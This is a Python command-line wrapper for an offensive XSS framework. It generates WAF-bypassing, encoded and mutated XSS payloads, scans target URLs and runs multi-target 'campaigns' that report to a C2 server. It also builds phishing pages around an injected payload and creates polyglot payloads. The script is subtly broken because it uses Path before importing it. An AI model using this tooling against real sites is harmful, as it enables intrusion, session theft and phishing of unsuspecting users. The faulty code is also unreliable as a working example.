#!/usr/bin/env python3
import sys
sys.path.insert(0, str(Path(__file__).parent.parent))

from core.xss_framework import XSSPayloadGenerator, XSSScanner, XSSExploitFramework, XSSTarget, XSSContext, XSSVectorType
import json
import argparse
from pathlib import Path

def generate_payloads(args):
    generator = XSSPayloadGenerator()
    context = XSSContext[args.context.upper()]
    payloads = generator.generate(context, waf_bypass=args.waf, count=args.count)
    
    if args.encode:
        encoded = []
        for p in payloads:
            encoded.append({
                'original': p.vector,
                'encoded': generator.encode_payload(p.vector, args.encode),
                'encoding': args.encode
            })
        print(json.dumps(encoded, indent=2))
    elif args.mutate:
        for p in payloads:
            mutations = generator.mutate_payload(p.vector, args.mutate)
            print(f"Original: {p.vector}")
            for m in mutations:
                print(f"  -> {m}")
            print()
    else:
        for p in payloads:
            print(p.vector)

def scan_target(args):
    generator = XSSPayloadGenerator()
    scanner = XSSScanner(generator)
    
    target = XSSTarget(
        url=args.url,
        parameter=args.param,
        method=args.method,
        context=XSSContext[args.context.upper()] if args.context else XSSContext.HTML_BODY
    )
    
    payloads = generator.generate(target.context, waf_bypass=args.waf, count=args.count)
    results = scanner.scan_target(target, payloads)
    
    vulnerable = [r for r in results if r.get('vulnerable')]
    print(f"Tested {len(payloads)} payloads, found {len(vulnerable)} vulnerable")
    
    for r in vulnerable:
        print(f"\n[VULNERABLE] {r['url']}")
        print(f"  Parameter: {r['parameter']}")
        print(f"  Payload: {r['payload']}")
        print(f"  Context: {r['context']}")
        print(f"  Reflected: {r['reflected']}, Executed: {r['executed']}")

def run_campaign(args):
    framework = XSSExploitFramework(c2_url=args.c2)
    generator = XSSPayloadGenerator()
    
    targets = []
    if args.target_file:
        import csv
        with open(args.target_file) as f:
            reader = csv.DictReader(f)
            for row in reader:
                targets.append(XSSTarget(
                    url=row['url'],
                    parameter=row.get('parameter', 'q'),
                    method=row.get('method', 'GET')
                ))
    else:
        targets.append(XSSTarget(url=args.url, parameter=args.param, method=args.method))
    
    campaign_id = framework.create_campaign(args.name, targets)
    print(f"Created campaign: {campaign_id}")
    
    result = framework.execute_campaign(campaign_id)
    print(f"Campaign completed. Found {len([r for r in result['results'] if r.get('vulnerable')])} vulnerabilities")
    
    if args.output:
        with open(args.output, 'w') as f:
            f.write(framework.export_campaign(campaign_id, args.format))

def generate_phishing(args):
    framework = XSSExploitFramework(c2_url=args.c2)
    generator = XSSPayloadGenerator()
    
    payloads = generator.generate(XSSContext.HTML_BODY, waf_bypass=True, count=1)
    payload = payloads[0].vector if payloads else "<script>alert(1)</script>"
    
    page = framework.generate_phishing_page(args.target_url, payload, args.template)
    
    if args.output:
        Path(args.output).write_text(page)
        print(f"Phishing page saved to {args.output}")
    else:
        print(page)

def polyglot(args):
    generator = XSSPayloadGenerator()
    contexts = [XSSContext[c.upper()] for c in args.contexts.split(',')]
    polyglot = generator.build_polyglot(contexts)
    print(polyglot)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='XSS Payload Generator & Scanner')
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    gen_parser = subparsers.add_parser('generate', help='Generate XSS payloads')
    gen_parser.add_argument('--context', default='HTML_BODY', choices=[c.name for c in XSSContext])
    gen_parser.add_argument('--waf', action='store_true', help='WAF bypass payloads')
    gen_parser.add_argument('--count', type=int, default=10)
    gen_parser.add_argument('--encode', choices=['html', 'html_decimal', 'url', 'unicode', 'hex', 'base64', 'double_url', 'mixed'])
    gen_parser.add_argument('--mutate', type=int, help='Number of mutations')
    
    scan_parser = subparsers.add_parser('scan', help='Scan target for XSS')
    scan_parser.add_argument('--url', required=True)
    scan_parser.add_argument('--param', default='q')
    scan_parser.add_argument('--method', default='GET')
    scan_parser.add_argument('--context', choices=[c.name for c in XSSContext])
    scan_parser.add_argument('--waf', action='store_true')
    scan_parser.add_argument('--count', type=int, default=20)
    
    camp_parser = subparsers.add_parser('campaign', help='Run XSS campaign')
    camp_parser.add_argument('--name', default='xss_campaign')
    camp_parser.add_argument('--url')
    camp_parser.add_argument('--param', default='q')
    camp_parser.add_argument('--method', default='GET')
    camp_parser.add_argument('--target-file', help='CSV file with url,parameter,method columns')
    camp_parser.add_argument('--c2', default='http://localhost:8080')
    camp_parser.add_argument('--output')
    camp_parser.add_argument('--format', choices=['json', 'csv'], default='json')
    
    phish_parser = subparsers.add_parser('phishing', help='Generate phishing page')
    phish_parser.add_argument('--target-url', required=True)
    phish_parser.add_argument('--c2', default='http://localhost:8080')
    phish_parser.add_argument('--template', choices=['login', 'generic', 'pdf'], default='login')
    phish_parser.add_argument('--output')
    
    poly_parser = subparsers.add_parser('polyglot', help='Generate polyglot payload')
    poly_parser.add_argument('--contexts', default='HTML_BODY,HTML_ATTRIBUTE,JAVASCRIPT')
    
    args = parser.parse_args()
    
    if args.command == 'generate':
        generate_payloads(args)
    elif args.command == 'scan':
        scan_target(args)
    elif args.command == 'campaign':
        run_campaign(args)
    elif args.command == 'phishing':
        generate_phishing(args)
    elif args.command == 'polyglot':
        polyglot(args)